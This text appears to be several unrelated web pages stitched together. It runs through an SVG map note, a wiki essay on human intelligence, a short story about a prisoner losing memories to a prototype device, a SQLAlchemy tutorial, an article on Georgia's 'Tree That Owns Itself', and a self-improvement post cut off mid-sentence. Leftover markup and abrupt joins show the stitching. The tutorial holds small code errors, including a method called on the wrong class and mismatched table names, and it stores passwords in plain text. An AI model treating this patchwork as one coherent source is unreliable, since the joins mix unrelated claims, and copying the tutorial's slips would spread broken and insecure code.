
<p><strong>Note:</strong> luckily, the map was uploaded on Wikipedia as SVG, so it was simply edited with a text editor to add the gradients (using Inkscape to match the objects with their ids). I do not usually like cylindrical projections (my favourite is <a href="http://en.wikipedia.org/wiki/Robinson_projection">Robinson</a>’s, and yes, <a href="http://xkcd.com/977/">I like coffee</a>), but this time it made drawing gradients so much easier. And the <a href="http://en.wikipedia.org/wiki/Miller_cylindrical_projection">Miller</a> is a fair enough compromise.</p>

<h2><span id="What_is_intelligence.3F">What is intelligence?</span></h2>
<p>In humans, <b><a href="https://supermemo.guru/wiki/Intelligence" title="Intelligence">intelligence</a></b> is a measure of the ability to <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">solve problems</a>.
</p>
<h2><span id="What_determines_intelligence.3F">What determines intelligence?</span></h2>
<p>Human intelligence depends on (1) innate qualities, (2) upbringing and (3) knowledge. 
</p><p><b>(1)</b> The <b>Genetic component</b> of intelligence is most apparent in the difference between humans and apes (see: <a href="https://supermemo.guru/wiki/Pleasure_of_communication" title="Pleasure of communication">Pleasure of communication</a>), however, it is far less prominent in a healthy human population. Some personality traits may have a greater impact on the ultimate intelligence than the actual innate brain processing power.
</p><p><b>(2)</b> <b>Upbringing</b> plays a crucial role in human intelligence. It should primarily be understood as the period when future intelligence can be undermined by disease, abuse, neglect and/or by limits on freedom. For healthy children, love and <a href="https://supermemo.guru/wiki/Optimization_of_behavioral_spaces_in_development" title="Optimization of behavioral spaces in development">free access to rich environments</a> is usually a sufficient condition for developing high intelligence.
</p><p><b>(3)</b> <b>Knowledge</b>: Given a basic genetic endowment and a healthy modern upbringing, most differences in adult human intelligence can be explained by learning and learning habits. There is also an important component of the interaction between the brain, the personality, and the environment. Some high-potential individuals get trapped in a set of <a href="https://supermemo.guru/wiki/Behavioral_system" title="Behavioral system">behavioral systems</a> that result in stagnation that may be hard to escape.
</p><p>Human intelligence has self-amplifying powers that may be undercut (1) internally by a pathology (or aging), or (2) externally by limits on freedom, esp. <a href="https://supermemo.guru/wiki/Free_learning" title="Free learning">freedom of learning</a> (e.g. <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>).
</p>
<h2><span id="Universal_intelligence_is_elusive">Universal intelligence is elusive</span></h2>
<p>In healthy adults, intelligence is a domain-specific problem solving capacity. The concept of innate universal intelligence is a myth. A highly knowledgeable individual may show a spark of genius across many domains and come close to the sense of universal intelligence. We may use the term, a <b>Renaissance (wo)man</b> or a <b>polymath</b> in reference to such a person. Wide learning may provide an illusion of universal intelligence. This seemingly universal intelligence often runs in families. This may be explained by family culture, personality traits, and only to a minor degree by genes associated with the actual processing power of the brain.
</p><p>As much as there is no universal intelligence, there is no universal IQ test. All tests will depend on prior knowledge, interests, exposure, culture and other biases. Howard Gardner proposed the concept of <a href="https://en.wikipedia.org/wiki/Theory_of_multiple_intelligences">multiple intelligences</a>, where neurophysiological modalities may determine a preference for a specific type of cognitive processing. His thinking can be extended to all aspects of human knowledge where domain-specific training leads to the <a href="https://supermemo.guru/wiki/Emergence" title="Emergence">emergence</a> of domain-specific intelligence. In other words, there are as many intelligences as there are intelligent human brains. Correlations that lead to the concept of <a href="https://en.wikipedia.org/wiki/G_factor_(psychometrics)"><i>g factor</i></a> are all rooted in cross-domain transfers (e.g. in a set of positive feedback loops, learning may affect sleep, circulation, neurogenesis, mood, etc.).
</p><p>As much as there is no universal problem solving capacity, there is no universal problem solving test (see: <a href="https://supermemo.guru/wiki/PISA_fuels_the_education_arms_race" title="PISA fuels the education arms race">PISA refocuses on problem solving</a>). This extends to artificial intelligence. We cannot dismiss a state-of-the-art system on the grounds that <i>"all it can do is play Go"</i>. It is true that we still struggle to produce an artificially intelligent system that would show universal <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">learn drive</a> sufficient for the <a href="https://supermemo.guru/wiki/Emergence" title="Emergence">emergence</a> of highly applicable <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> when immersed in any domain. However, once we arrive there, we will still need to train the system in specific domains to call it truly intelligent.
</p>
<h2><span id="How_does_aging_affect_intelligence.3F">How does aging affect intelligence?</span></h2>
<p>In a healthy adult, domain-specific problem solving capacity will usually follow a curve in which there is an ascent in youth and a decline at older ages. The shape of that curve is determined by the balance of gains and losses. Gains are usually associated with learning, esp. learning via problem solving. Losses are mostly associated with health, esp. metal health, or neglect. As intelligence is a self-perpetuating quality, those who gain intelligence early may continue thriving into a very old age. On rare occasions, the effects of aging can be entirely compensated by lifelong learning, even in <a href="https://supermemo.guru/wiki/How_fast_does_memory_decline_with_age%3F" title="How fast does memory decline with age?">octogenarians and beyond</a>.
</p>
<h2><span id="Intelligence_prescription">Intelligence prescription</span></h2>
<p>The above reasoning leads to a simple formula for high intelligence:
</p>
<p>To maximize intelligence, we should focus on maximizing the acquisition of <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">high-quality knowledge</a></p>
<p>The term <i>high quality</i> stands here primarily for <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">coherence</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a> (see: <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">Abstract knowledge</a>).
</p><p>The above formula is universal and hermetic. It dispenses of the problem of the starting point, which will often differ vastly between individuals. It carries an important optimistic message that accelerates progress: <b>there are few innate obstacles to high intelligence</b>.
</p>
<h2><span id="How_can_we_make_populations_more_intelligent.3F">How can we make populations more intelligent?</span></h2>
<p>Immense progress could be achieved if adults could eliminate only two factors: (1) <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a> and (2) <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">sleep</a> problems. As personality traits are set, escaping from toxic human environments may also play a role for a large proportion of the population. Millions of people fail to live up to their potential due to being suppressed by their work environment or even family. Work environments must be friendly and families must thrive on love. Without those preconditions, achieving high intelligence is difficult. The balance of gains and losses may be negative or insufficiently positive. In addition, for a large proportion of children, the chances for growth are stunted by <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>. Schools often promote bad learning habits, loss of self-reliance and unhealthy social environments. One of the best predictors of future high intelligence is a well-established and intense <a href="https://supermemo.guru/wiki/Passion_and_memory" title="Passion and memory">childhood passion</a>.
</p><p>There is nothing wrong with striving at genius. See my <a href="https://supermemo.guru/wiki/Genius_checklist" title="Genius checklist">Genius checklist</a> for some hints. In short, if you are unhesitantly involved in passionate problem solving associated with perpetual learning, you can rest assured: you are on the ascending curve towards high intelligence. All you need to remember is to shelter your efforts from possible disruptions to this self-empowering status quo.

<h2><span id="Intelligence_vs._knowledge">Intelligence vs. knowledge</span></h2>
<p>Stable knowledge and new knowledge play key roles in intelligence. For details see: <a href="https://supermemo.guru/wiki/Knowledge_in_creative_problem_solving" title="Knowledge in creative problem solving">Knowledge in creative problem solving</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>5:58 am</em><br><em>May 16, 2040 AD</em><br><em>State Correctional Institute Greene, Pennsylvania</em></p><p>It’s not every day, you are wrongly accused of murder and then sent to the best-facilitated prison in the country that hosts the most dangerous of the criminals. To think that others now thought I was a dangerous criminal as well was unsettling. The first person who died after I arrived at the ‘Correctional Institution’ was a 49-year-old Chinese-American named Li Wei. She had been there for 21 years for killing her teacher and would probably have been there for more but she had given up her right to appeal and had requested execution. After the initial shock had passed, I tried staying away from the other inmates. Forming attachments in a prison wasn’t a good idea. The way I saw it, they could be executed at any time.</p><p>“Count time. Turn the light on and stand at the door.” The loudspeakers came on as usual at 6 a.m. A few minutes later, breakfast trays were handed through the bars of the cell doors.</p><p>Today I was allowed in the unit’s law library. The two hours were never enough to gather enough information. Searching through the legal databases sitting in a cubicle using an old-fashioned computer from the year 2020 was enough to give anyone a headache and I was nowhere near prepared for my appeal hearings. When the two hours were up, I was led to my cell. What I wouldn’t do to get my old life back.</p><p>It was difficult to grasp how I had gone from being a bookworm holed in my apartment 24/7 to being accused of murdering a police officer. It would be years before I was proven innocent and another year before I was let out. To think I got here because of a glitch in the system’s face recognition system. They were willing to let a young innocent girl die rather than admit that there was something wrong with their technology. Having been here a month already and nowhere close to gathering enough information to prove my innocence, I had lost faith in God and the system. I had resigned myself to this cruel fate that God had handed me in a battered and dented platter.</p><p><em>Please let me find something to prove my innocence.</em></p><p>God must have heard my prayers because two days later members from the SCITECH arrived promptly at 11 in the afternoon.</p><p>Hearing the whispers from the others, I had already gathered that they were here to find volunteers to try out their newest technology because who better to try out your newest ‘technology’ on than the prisoners who had appealed for execution. Even if something went wrong, they would die anyway. If the technology worked, it’s all the better for them. We were nothing but <em>lab rats</em> to them. My lips curled in distaste. I wasn’t interested in being a lab rat. The technology wasn’t something you could rely on 100%. My current situation was a testament to that.</p><p>They were rounding the halls twisting their words to gather volunteers. I had lost interest in them and was playing chess by myself until they stood in front of my cell. There were three of them. The one in the middle seemed like he was the spokesperson. The other two were murmuring in the background.</p><p>“As you may have already gathered — ”</p><p>“Not interested.” I interrupted. He looked shocked as if a prisoner would dare to interrupt him while he was speaking. I couldn’t care less if he was offended.</p><p>“It could help you clear your name.”</p><p>I slowly turned my head to the side. It was one of the guys that had been murmuring in the background before. But his words caught my attention.</p><p>“Excuse me? Clear my name? Exactly what is it that you want to test?”</p><p>I should have known better than to meddle with technology after everything that happened. But proving my innocence by becoming a lab rat seemed like a sweet deal at the time. But I was wrong like I had been wrong about everything else in my life.</p><p>10 minutes.</p><p>That’s all the time I have. 10 minutes until I lose the remaining of my memories. Until I lose myself. Until I rid myself of this pain.</p><p>Until I die.</p><p>600 seconds.</p><p>599…598…597…</p><p>Memories were supposed to last forever. Even when the moment had long passed and the tears had long dried. Even when the jokes were long said and laughter had long faded. But fate had dealt me with a cruel hand. It had left me with a fragment of my soul.</p><p>555…554…553…</p><p>The technology was supposed to have worked. Instead, M-mry had backfired. The device itself was small and the process simple. Put on the small headset that came with a remote-like device. Type in the year and select what you wanted to backup. I had chosen high school because I didn’t have fond memories of that time. Instead of backing my memories up, it had deleted it from the main server. From my brain, it had stolen 4 years of my precious memories. Ones that I would never get back. Rafe had promised it would work but of course, he had lied. After he had seen the initial interest and curiosity in my eyes, he had used everything and said everything he could to get me to volunteer. And like a desperate idiot I was, I had believed every word he had said about how M-mry would free me by proving my innocence. I could remember every word he had said he was watching me with his chips blue eyes unwaveringly whenever he spoke.</p><p>“<em>The technology is new and it’s the prototype but we are sure that it works. Simply put, it’s a way to back up your memory. If it works, your ideas would not be lost even when you died. If you suddenly had Alzheimer’s disease, then you would still have a way to access your memories. Hypothetically, M-mry could prove your innocence by looking through your memories.</em>”</p><p>And when I had been unsure and close to backing out, he had used the one thing that was most important to me: My family.</p><p>“<em>M-mry is your only hope of proving your innocence. If it works, you will able to leave and see your family whenever you want. You could hug them and live freely. Be able to marry and have kids one day. Otherwise, who knows, maybe even in 20 years you will still not have proved your innocence.</em>”</p><p>That had been enough for me to sign my name on the thick document that protected SCITECH in case something did go wrong. And something went wrong indeed. Not only had I lost my memories of high school but now I had no way of getting them back.</p><p>480…479…478…</p><p>I didn’t think the memories I thought useless and unimportant when forgotten would feel as if I had lost a piece of my soul.</p><p>460…459…458…</p><p>Two weeks ago I gave up my right to appeal and asked for my execution. The new memories living in this prison would never replace the old memories and I was never going to get out of here even if I stayed here 40 years being on my best behavior.</p><p>355…354…353…</p><p>I never thought I would end up here.</p><p>250…249…248..</p><p>With the barest of memories.</p><p>110…109…108..</p><p>I thought that when I died, I would at least die as myself.</p><p>30…29…28…</p><p>I didn’t think I would die a shadow of my former self.</p><p>10…9…8…</p><p>I didn’t think I would die, a stranger.</p><p>3…</p><hr><p><em>Edited by <a href="https://instagram.com/cherrywine_stains" title="Mrk (cherrywine_stains) Instagram Profile" rel="nofollow">cherrywine_stains</a></em></p></div></div>]]>

October 24, 2020 | https://leportella.com/sqlalchemy-tutorial/ | <a href="https://web.archive.org/web/*/https://leportella.com/sqlalchemy-tutorial/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><a href="https://leportella.com/sqlalchemy-tutorial/%7B%7Bbase%7D%7D/outreachy-I.html">I’ve been working with Project Jupyter since December of last year</a> and it has been a wonderful experience. The last couple of days I struggled with the SQLAlchemy library that <a href="https://github.com/jupyterhub/jupyterhub">JupyterHub</a> works on its internals. Since I studied this library and had to scratch some <a href="https://stackoverflow.com/">Stack Overflow</a> questions to find some answers, I created this post to help digesting some of my doubts and findings.</p>
<p>Since this post became surprisingly long, I decided that the main problem I was having with SQLAlchemy should be in a separated post. So, keep tuned :)</p>
<p>All code is available <a href="https://github.com/leportella/sqlalchemy-basics-post/">here</a>.</p>
<h2 id="creating-and-understanding-the-engine">Creating and understanding the Engine</h2>
<p>To start workin with SQLAlchemy, the first thing that they taught in the tutorials is to create an Engine. The Engine is how SQLAlchemy communicates with your database, so, when creating the Engine you should add your database (db) URL and that’s basically it.</p>
<p>Although we can access the db through Engine commands (we will see how), we usually don’t. You can, but you shouldn’t :)</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> create_engine

engine <span>=</span> create_engine(<span>'sqlite:///:memory:'</span>, echo<span>=</span>True)
</code></pre></div><p>So, you are just telling where your database currently is located. The attribute <code>echo=True</code> will make SQLAlchemy to log all SQL commands it is doing while you apply commands. This should not be activated in production, ok?</p>
<figure>
    <img src="https://i.imgur.com/0gVcCUg.png" width="200px"> 
</figure>

<p>Once your engine knows your database, it is easy to execute commands on it by using a method called <code>engine.execute(...)</code>. You can see how this is done here:</p>
<figure>
    <img src="https://raw.githubusercontent.com/leportella/sqlalchemy-basics-post/master/gifs/engine_execute.gif" width="450px"> 
</figure>

<p>So you have a two way street: the Engine that knows where your db is and a method (<code>engine.execute(...)</code>) to change the db using the Engine:</p>
<figure>
    <img src="https://i.imgur.com/yjdhaTZ.png" width="200px"> 
</figure>

<h2 id="engine-or-connection">Engine or connection?</h2>
<p>I also saw in some tutorials that you have another way of doing SQL commands through the <code>engine</code> by making a <code>connection</code> such as:</p>
<pre><code>conn = engine.connect()
conn.execute(...)
</code></pre><p>This allows us to create transaction commands, which means that all commands must be done successfully or all should rollback in case of an error [<a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/transactions-transact-sql?view=sql-server-2017">1</a>]:</p>
<div><pre><code data-lang="python">trans <span>=</span> conn<span>.</span>begin()
conn<span>.</span>execute(<span>'INSERT INTO "EX1" (name) '</span>
             <span>'VALUES ("Hello")'</span>)
trans<span>.</span>commit()
</code></pre></div><p>So, actually, the structure looks more like this now:</p>
<figure>
    <img src="https://i.imgur.com/Bcp1Zku.png" width="200px"> 
</figure>

<p>However, looking more deeply <a href="https://stackoverflow.com/a/34364247/3538098">some answers</a> about the differences between <code>engine.execute(...)</code> and <code>connection.execute(...)</code> I found that they are not different at all:</p>
<blockquote>
<p>“Using Engine.execute() and Connection.execute() is (almost) one the same thing, in formal, Connection object gets created implicitly, and in later case we explicitly instantiate it.’’</p>
</blockquote>
<p>So, feel free to use each one of those if you would like :)</p>
<h2 id="creating-and-understanding-sessions">Creating and understanding Sessions</h2>
<p>Until now we connected to our database and were able to execute commands through SQL statements. However, the thing that makes SQLAlchemy so attractive is its ORM, which was not discussed so far.</p>
<p>The ORM must have a <code>session</code> to make the middle-ground between the objects we will deal with in Python and the engine that actually communicates with the database. So, we need a function called <code>sessionmaker</code> that we’ll pass our engine to.</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy.orm <span>import</span> sessionmaker

Session <span>=</span> sessionmaker(bind<span>=</span>engine)
session <span>=</span> Session()
</code></pre></div><p>So, you will use sessions to talk to your tables and make queries, but is the <code>engine</code> that is actually implementing things on your db.</p>
<figure>
    <img src="https://i.imgur.com/iqV59ky.png" width="300px"> 
</figure>

<p>Although it seems confusing having three entities before even starting with our tables, most of the times after the initial setup you will use the <code>session</code> much more than the <code>engine</code> and <code>connection</code> will be done implicitly by the two firsts, ok?</p>
<h2 id="creating-tables">Creating tables</h2>
<p>Now we want to create tables in our db to work with them and finally start to take a look at SQLAlchemy’s ORM. To create new tables we will create classes that contain attributes. Each class will be a table in our db and each attribute will be a column in this table. To map which table in the db will be related to each class in our files, we will use a SQLAlchemy system called <em>Declarative</em>. To use this, the first thing we must do is to instantiate a <code>Base</code>:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy.ext.declarative <span>import</span> declarative_base

Base <span>=</span> declarative_base()
</code></pre></div><p>Now we create a class <code>User</code> that inherits from our <code>Base</code> declarative. We will create only three attributes to our class: <code>id</code> (which is a primary key and can’t be null), a name and a password. Since we are using <em>Declaratives</em>, we must add at least two attributes: 1) a <code>__tablename__</code> that how your table will be actually called inside the db and 2) at least one Column which is part of a primary key [<a href="https://docs.sqlalchemy.org/en/latest/orm/tutorial.html#declare-a-mapping">2</a>].</p>
<p>We will also add an optional method called <code>__repr__</code> that will be a string that will be returned when we see our user instance.</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, Integer, String

<span>class</span> <span>User</span>(Base):
    __tablename__ <span>=</span> <span>'users'</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)
    name <span>=</span> Column(String)
    password <span>=</span> Column(String)

    <span>def</span> __repr__(self):
        <span>return</span> f<span>'User {self.name}'</span>
</code></pre></div><p>We now have a class that indicates us how our table must be on our database. However, nothing is changed so far. To actually create the tables on our database, we will need the declarative <code>Base</code> we just created and the <code>engine</code>:</p>
<div><pre><code data-lang="python">Base<span>.</span>metadata<span>.</span>create_all(engine)
</code></pre></div><p>This is when SQLAlchemy will actually do something in our database. Since we have the variable <code>echo</code> set to <code>True</code>, we can see exactly which SQL statement the <code>engine</code> actually did on the database:</p>
<figure>
    <img src="https://i.imgur.com/kU4Snpb.png" width="400px"> 
</figure>

<h2 id="adding-new-records">Adding new records</h2>
<p>Now, we can use the class to create a new record on our database. We can user the <code>User</code> class to create a new user and <code>session.add(...)</code> to add the instance to our database.</p>
<div><pre><code data-lang="python">user <span>=</span> User(name<span>=</span><span>'John Snow'</span>, password<span>=</span><span>'johnspassword'</span>)
session<span>.</span>add(user)

<span>print</span>(user<span>.</span>id)  <span># None</span>
</code></pre></div><p>Now, even though we said we needed a primary key, I didn’t pass one for the model. And if I try to print the id of the user I just created, it will return <code>None</code>.</p>
<p>This is because <code>session.add</code> just register the transactions we want it to do, but it doesn’t actually do it [<a href="https://stackoverflow.com/a/4202016/3538098">3</a>].</p>
<p>As explained on <a href="https://stackoverflow.com/a/4202016/3538098">this link</a>, we have two operations that can be done here:</p>
<blockquote>
<p><code>session.flush()</code> communicates a series of operations to the database (insert, update, delete). The database maintains them as pending operations in a transaction. The changes aren’t persisted permanently to disk, or visible to other transactions until the database receives a COMMIT for the current transaction (which is what <code>session.commit()</code> does).</p>
</blockquote>
<p>or</p>
<blockquote>
<p><code>session.commit()</code> commits (persists) those changes to the database. <code>session.commit()</code> always calls for <code>session.flush()</code> as part of it.</p>
</blockquote>
<h2 id="making-queries">Making queries</h2>
<p>Once we have our records on our database, we need to be able to find them :)</p>
<p>So, to the <code>query</code> function of our <code>session</code> we will pass the class we want to look for our instance, an then use the method to filter by an attribute called <code>filter_by</code>.</p>
<div><pre><code data-lang="python">query <span>=</span> session<span>.</span>query(User)<span>.</span>filter_by(name<span>=</span><span>'John'</span>)
</code></pre></div><p>Finally, we pass a method to indicate what we want to do with this query: count the number of records found (<code>.count()</code>), return all records found (<code>.all()</code>), return the first record (<code>.first()</code>) and so on:</p>
<p>Another way is to use the <code>filter</code> method, instead of the <code>filter_by</code>, which has a slightly different syntax:</p>
<div><pre><code data-lang="python">session<span>.</span>query(User)<span>.</span>filter(User<span>.</span>name<span>==</span><span>'John'</span>)<span>.</span>first()
</code></pre></div><p>With <code>filter</code> method, you can also look for strings similar to what you have:</p>
<div><pre><code data-lang="python">session<span>.</span>query(User)<span>.</span>filter(User<span>.</span>name<span>.</span>like(<span>'%John%'</span>))<span>.</span>first()
</code></pre></div><p>On <a href="https://github.com/jupyterhub/jupyterhub">Jupyterhub</a> they added to each model a <em>classmethod</em> that would simplify this rather complicated syntax. We can add a method that you can pass a <code>session</code>, an attribute, and it returns all the elements, for instance:</p>
<div><pre><code data-lang="python"><span>class</span> <span>User</span>(Base):
  <span>...</span>

  <span>@classmethod</span>
  <span>def</span> <span>find_by_name</span>(cls, session, name):
    <span>return</span> session<span>.</span>query(cls)<span>.</span>filter_by(name<span>=</span>name)<span>.</span>all()
</code></pre></div><p>So, the new way to find all users named only ‘John’:</p>
<div><pre><code data-lang="python">Product<span>.</span>find_by_name(session, <span>'John'</span>)
</code></pre></div><h2 id="creating-new-tables-tables-after-initial-create_all">Creating new tables tables after initial create_all</h2>
<p>On problem I bump into while I was working with <a href="https://jupyter.org/">Project Jupyter</a> was that I needed to create a new table to a database and <code>engine</code> that already had a initial creation (the <code>Base.metadata.create_all(engine)</code>).</p>
<p>So, imagine that now I want a table with Products such as the following:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, Integer, String

<span>class</span> <span>Product</span>(Base):
    __tablename__ <span>=</span> <span>'products'</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)
    name <span>=</span> Column(String)
</code></pre></div><p>The simplest way I found to do this was simply:</p>
<div><pre><code data-lang="python">Product<span>.</span>__table__<span>.</span>create(engine)
</code></pre></div><h2 id="creating-a-foreign-key-relationship">Creating a Foreign Key relationship</h2>
<p>Imagine that you would like to connect each product to a user in your system. So, in each instance of <code>Product</code> you would like to store an instance of <code>User</code>:</p>
<figure>
    <img src="https://i.imgur.com/BJqWSMj.png" width="350px"> 
</figure>

<p>If you you are creating all tables now, you should add a Column on your <code>Product</code> class that references the Foreign Key of the user and a relationship with the <code>User</code> class:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, ForeignKey, Integer, String
<span>from</span> sqlalchemy.orm <span>import</span> relationship

<span>class</span> <span>Product</span>(Base):
    __tablename__ <span>=</span> <span>'product'</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)
    name <span>=</span> Column(String)
    user_id <span>=</span> Column(Integer, ForeignKey(<span>'user.id'</span>))
    user <span>=</span> relationship(<span>'User'</span>)
</code></pre></div><p>And add a relationship between <code>User</code> and <code>Product</code> on <code>User</code> class:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, Integer, String
<span>from</span> sqlalchemy.orm <span>import</span> relationship

<span>class</span> <span>User</span>(Base):
    __tablename__ <span>=</span> <span>'user'</span>  <span># if you use base it is obligatory</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)  <span># obligatory</span>
    name <span>=</span> Column(String)
    password <span>=</span> Column(String)
    products <span>=</span> relationship(Product, backref<span>=</span><span>"users"</span>)
</code></pre></div><p>Now you can create all tables by using the <code>Base.metada.create_all(engine)</code> we have seen previously.</p>
<p>Now, you can create a user and a product that are related with each other:</p>
<div><pre><code data-lang="python">user <span>=</span> User(name<span>=</span><span>'John'</span>)
product <span>=</span> Product(name<span>=</span><span>'wolf'</span>, user<span>=</span>user)

session<span>.</span>add_all([user, product])
session<span>.</span>commit()
</code></pre></div><p>And that’s it :)</p>

		<p>No matter how famous or how ancient, all trees are ultimately owned by someone. It could be a government, a trust, or even just an individual caretaker. However, one white oak tree in Athens, Georgia was reportedly so beloved by its owner that upon his death, he gave the tree ownership of itself in his will.<span id="more-2706"></span></p>
<h2>The Legend of the Tree That Owns Itself</h2>
<p>The legend goes that a particularly large and beautiful white oak played a special role in the childhood of its owner, Colonel William Henry Jackson. When he died some time between 1820 and 1832, he deeded the tree and the soil around it to the tree itself. Here is the reported text of his will:</p>
<blockquote><p>I, W. H. Jackson, of the county of Clarke, of the one part, and the oak tree&nbsp;… of the county of Clarke, of the other part: Witnesseth, That the said W. H. Jackson for and in consideration of the great affection which he bears said tree, and his great desire to see it protected has conveyed, and by these presents do convey unto the said oak tree entire possession of itself and of all land within eight feet [2.4 m] of it on all sides.</p></blockquote>

<p>After that, the tree become known as the Tree that Owns Itself. However, there are a number of problems with the story’s validity. It originally ran as a front page story in the <em>Athens Banner Weekly</em> on August 12, 1890. That’s some 60 years after the supposed transaction took place, and there are no indications that anything special had happened to the tree before that (although it was known as Jackson’s Tree).</p>
<p>On top of that, the only witness to the will itself is the author of the article, and no one has been able to confirm that the statement above was ever made. However, the story became so popular that no one dared doubt the tree’s self-ownership. Effectively, the tree owned itself because everyone said it did.</p>
<p>Legally, of course, the tree isn’t able to own itself regardless of Jackson’s wishes. In fact, careful examination of property lines reveals that the tree isn’t even on his property. It’s officially part of the street (since it’s part of a median in the middle of the street), so its care falls to local authorities.</p>
<p>However, the tree is such a well respected landmark in the city that the Athens-Clarke County government has declared that in spite of the actual legality, the tree owns itself. Because they said so.</p>

<h2>Can a tree have rights?</h2>
<p>It might seem strange that a tree can own anything, let alone itself, but there is actually some legal precedent. Although they usually take a back seat to animal rights, plant rights have been discussed in several countries around the world.</p>
<p>In the Netherlands, a party called <a href="https://in.reuters.com/article/us-dutch-election-plants/plant-rights-party-to-contest-next-dutch-election-idINTRE62S2HA20100329">the Party for the Plants</a> was created to try to snag a few seats in the 2010 parliamentary elections. Although they weren’t particularly successful, their platform focused exclusively on promoting biodiversity and protecting plants from being harvested for biofuels.</p>
<p>More success has been found in New Zealand, where for the first time anywhere a forest was granted legal personhood and ownership of itself. The&nbsp;Te Urewera Act of 2014 changed the legal status of Te Urewera, a forest sacred to the Maori people, from a Natural Park into <a href="http://maorilawreview.co.nz/2014/10/tuhoe-crown-settlement-te-urewera-act-2014/">its own legal entity</a>.</p>

<p>Obviously the forest can’t speak for itself, so a board was set up “to act on behalf of, and in the name of, Te Urewera”. In March 2017 a second act was passed granting similar rights to the Whanganui River, since the local Maori tribe consider the river itself to be their ancestor.</p>
<p>Although it doesn’t go as far as giving trees and other plants ownership of themselves, the Clean Water Act of 1972 in the United States effectively grants them some rights. Under the ‘natural resource damage’ provisions of the law, trees and other resources have some basic rights. It’s the government, however, that’s entrusted with protecting those rights, although any money earned through litigation must be spent on the resource itself. Essentially, the money <em>belongs</em> to the resource.</p>
<h2>The Son of The Tree That Owns Itself</h2>
<p>The Tree That Owns Itself might have been granted semi-legal status in Athens-Clarke County, but that didn’t protect it from the whims of Mother Nature. It was heavily damaged in an ice storm in 1907, and eventually fell down in 1942. Many suspected that the tree had died long before falling.</p>
<p>But if the tree owned land, surely it must pass on to its next of kin. A tree grown from an acorn of the Tree That Owns Itself was selected as the heir, an transplanted into its new home in 1946. It also inherited the name, although it’s also referred to as the Son of the Tree That Owns Itself.</p>

<p>It’s now been more than 70 years since the tree moved in to the quiet residential neighborhood on Finley Street, and it appears to be doing well. Despite its unknown legal status, the legend lives on with a plaque commemorating the words that started it all. Slightly edited to be more intelligible to modern readers, it reads:</p>
<blockquote><p>For and in consideration of the great love I bear this tree and the and the great desire I have for its protection for all time, I convey entire possession of itself and all land within eight feed of the tree on all sides<br>
-William M Jackson</p></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last friday added another count to the yearly event we celebrate as “birthday”. I can barely remember my last birthday, I’m not a big birthday celebration person. I think every day can be a celebration if you choose it to be and a yearly event is not sufficient reason to treat yourself.<br></p><p>The passage of time seems to have changed over the years. Things move by at light speed, and if I blink I miss it. It doesn’t feel like a lot happened, and yet if I sit down and think about my last 1 year, a LOT has happened.</p><p>As I was reminiscing, I went beyond the last 1 year and thought generally of the value system that governs my life. These things come “obviously” to me and they’ve made my life better. I hope these values can serve you as well.</p><h3>1. Fixed vs Growth mindset</h3><p>If you’re anything like me from a few years ago, whenever someone would tell you a way to improve yourself or your life, your default reaction would be “yeah yeah but my life is hard I have X Y and Z reasons why I cannot do something about it”. </p><p>That’s fixed mindset. It’s when your mind operates under the base assumption that you, your situation, your surroundings, and your abilities, everything is static and fixed.</p><p>On the opposite end of the same spectrum is Growth mindset. Here, your mind knows and believes that everything is a work in progress, everything can be changed, and the path to changing something about your life that you don’t completely like is a path of fulfilment, not pain that you want to ignore.</p><p>A fixed mindset plateaus. A person with growth mindset improves and grows, a tiny bit, everyday and forever. </p><h3>2. Complaining drags you down, think problem-solutions instead</h3><p>I could complain about all the problems in my life, or I could list them down, write their probable cause, probable solutions, and the gaps in my knowledge that I need to fill with research to better understand the problem and find better solutions.</p><p>The energy that is used in complaining can be applied towards finding solutions. Not only do you not feel like shit, solving a problem is a positive experience and gives you the sense of control over your life vs submitting to “my life is so hard and the universe is out to get me”.</p><p>Sankalp was watching Mirzapur and shared this with me last night - </p><p><em>“I was watching Mirzapur today. There was a scene where the dons primary gun factory is burnt down to the ground by his rival. </em></p><p><em>He arrives at the scene, calmly guages the situation, then calls the CM who is one of his allies and tells him to release a press statement that the govt has tracked down a gun factory run by a criminal org, burnt it and put all the perpetrators in jail thereby making the state a safer place for everyone and uplift the party's image.”</em><br></p><h3>3. 0 or 1, choices are binary</h3><p>Most of the things in life are an either or. You either got up early today, or you didn’t. You either hit the gym, or you didn’t. </p><p>You could spend a lot of time in analysis of the gray area in between, but it’s a wasted effort on aspects of your life that operate like a transistor.It’s either 0 or 1, switched off or on.</p><p>Identify binary choices in your life and make them swiftly.<br></p><h3>4. Everything is on a spectrum</h3><p>At the same time, a lot of things in life are indeed in the gray area. These don’t have easy choices with clear outcomes, and yet you have to identify the spectrum and decide where you want to be on it in order to move ahead.</p><p>Hitting the gym is binary, how intensely you work out is on a spectrum.</p><p>Choosing to start a business is binary, how risky a path you pick lies on a spectrum.<br></p><h3>5. via negativa. Addition by subtraction</h3><p>The solution to most 